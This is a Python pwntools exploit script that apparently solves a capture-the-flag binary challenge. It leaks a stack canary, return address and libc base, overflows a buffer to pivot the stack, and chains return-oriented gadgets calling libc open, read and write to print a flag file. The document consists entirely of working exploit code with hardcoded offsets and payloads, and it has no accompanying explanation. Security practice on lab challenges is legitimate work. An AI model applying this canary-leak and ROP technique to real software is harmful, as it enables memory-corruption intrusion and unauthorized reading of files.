#!/usr/bin/env python3
from pwn import *

LDPRELOAD = "./so/libc.so.6"

r = process(["./share/chal"], env={"LD_PRELOAD": LDPRELOAD})
# r = remote("10.113.184.121", 10056)

r.recvuntil(b"Haaton's name? ")
r.sendline(b"A" * 0x13)  # n2 -> 0x61
r.recvuntil(b"hachamachama\n")
r.recvuntil(b"ECHO HACHAMA!\n")

# Get canary, ret

header = b"HACHAMA\x00"
r.sendline(header)
line = r.recv(0x60)

# stack = name[0x20] + buf2[0x30] + padding[0x8] + canary[0x8] + rbp[0x8] + ret[0x8] + padding[0x8] + main[0x8]
# line = buf2[0x30] + padding[0x8] + canary[0x8] + rbp[0x8] + ret[0x8] + padding[0x8] + main[0x8]

canary = u64(line[0x38:0x40])
rbp = u64(line[0x40:0x48])
ret = u64(line[0x48:0x50])
main = u64(line[0x58:0x60])

print("canary: ", hex(canary))
print("rbp: ", hex(rbp))
print("ret: ", hex(ret))
print("main: ", hex(main))

elf_base = main - 0x1331

read_again = elf_base + 0x1454
data_start = elf_base + 0x4000
elf_n2 = elf_base + 0x4180

print("read_again: ", hex(read_again))
print("data_start: ", hex(data_start))
print("elf_n2: ", hex(elf_n2))

libc_base = ret - 0x29D90

libc_pop_rdi_ret = libc_base + 0x000000000002A3E5
libc_pop_rsi_ret = libc_base + 0x000000000002BE51
libc_pop_rdx_rbx_ret = libc_base + 0x0000000000090529
libc_open_addr = libc_base + 0x114690
libc_read_addr = libc_base + 0x114980
libc_write_addr = libc_base + 0x114A20

print("libc_base: ", hex(libc_base))
print("libc_pop_rdi_ret: ", hex(libc_pop_rdi_ret))
print("libc_pop_rsi_ret: ", hex(libc_pop_rsi_ret))
print("libc_pop_rdx_rbx_ret: ", hex(libc_pop_rdx_rbx_ret))
print("libc_open_addr: ", hex(libc_open_addr))
print("libc_read_addr: ", hex(libc_read_addr))
print("libc_write_addr: ", hex(libc_write_addr))

# Stack metadata

buf_size = 0xA0
stack_1 = data_start + 0x60
stack_2 = data_start + buf_size + 0x20 + 0x60

# Rewrite n2: step 1

payload = (
    header
    + b"A" * (0x38 - len(header))
    + p64(canary)
    + p64(elf_n2 - 0x18)
    + p64(read_again)
)

r.sendline(payload)
r.recvline()
r.sendline(p64(0))


# Rewrite n2: step 2

payload = (
    header
    + b"A" * (0x38 - len(header))
    + p64(canary)
    + p64(stack_1)
    + p64(read_again)
    + p64(read_again)
    + p64(buf_size)
)

r.sendline(payload)
r.recvline()
r.sendline(p64(0))


# open("/home/chal/flag.txt", 0, 0)

payload = (
    header
    + b"A" * (0x38 - len(header))
    + p64(canary)
    + p64(stack_2)
    + p64(libc_pop_rdi_ret)
    + p64(stack_1 - 0x40)
    + p64(libc_pop_rsi_ret)
    + p64(0)
    + p64(libc_pop_rdx_rbx_ret)
    + p64(0)
    + p64(0)
    + p64(libc_open_addr)
    + p64(read_again)
)

r.sendline(payload)
r.recvline()
r.sendline(b"/home/chal/flag.txt\x00")


# read(3, bss_start, 0x62)

payload = (
    header
    + b"A" * (0x38 - len(header))
    + p64(canary)
    + p64(stack_1)
    + p64(libc_pop_rdi_ret)
    + p64(3)
    + p64(libc_pop_rsi_ret)
    + p64(stack_2 - 0x40)
    + p64(libc_pop_rdx_rbx_ret)
    + p64(0x62)
    + p64(0)
    + p64(libc_read_addr)
    + p64(read_again)
)

r.sendline(payload)
r.recvline()
r.sendline(p64(0))


# write(1, bss_start, 0x62)

payload = (
    header
    + b"A" * (0x38 - len(header))
    + p64(canary)
    + p64(stack_2)
    + p64(libc_pop_rdi_ret)
    + p64(1)
    + p64(libc_pop_rsi_ret)
    + p64(stack_2 - 0x40)
    + p64(libc_pop_rdx_rbx_ret)
    + p64(0x62)
    + p64(0)
    + p64(libc_write_addr)
    + p64(read_again)
)

r.sendline(payload)
r.recvline()
r.sendline(p64(0))

flag = r.recvline()
flag = flag[flag.find(b"flag") : flag.find(b"\n")]
print(flag)

r.interactive()
